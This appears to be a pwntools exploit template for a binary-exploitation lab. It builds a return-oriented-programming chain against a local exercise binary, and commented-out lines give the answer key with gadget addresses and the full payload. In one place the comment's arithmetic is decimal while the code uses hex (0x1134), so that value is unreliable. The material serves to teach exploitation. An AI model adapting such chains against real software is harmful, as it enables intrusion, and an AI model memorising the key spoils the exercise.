#!/usr/bin/env python3
from pwn import *

io = process(['./run.sh', 'part3'])

io.recvuntil(b"Enter some bytes: ")

# TODO: Fill in the address for gadgets and win function
GADGET_1 = 0x0
GADGET_2 = 0x0
GADGET_3 = 0x0
GADGET_4 = 0x0
GADGET_5 = 0x0
WIN      = 0x0

# ans
# GADGET_1 = 0x800003f0
# GADGET_2 = 0x80000400
# GADGET_3 = 0x80000410
# GADGET_4 = 0x80000428
# WIN      = 0x80000448


# TODO: Complete the input_text that satisfy the requirement for win
input_text = b''

# ans:
# 
# # a3_value -100 + 1234 = Target => a3_value = Target - 1134
# TARGET = 0x5A5A5A5A
# a3_value = TARGET - 0x1134

# input_text += b'A' * 4
# input_text += p32(GADGET_1)
# input_text += b'B' * 8
# input_text += p32(a3_value)
# input_text += p32(GADGET_2)
# input_text += p32(GADGET_3)
# input_text += p32(GADGET_4)
# input_text += p32(WIN)

io.sendline(input_text)

while True:
    try:
        cur_char = io.recv(1).replace(b'\r', b'')
        print(cur_char.decode(), end='')
    except UnicodeDecodeError:
        pass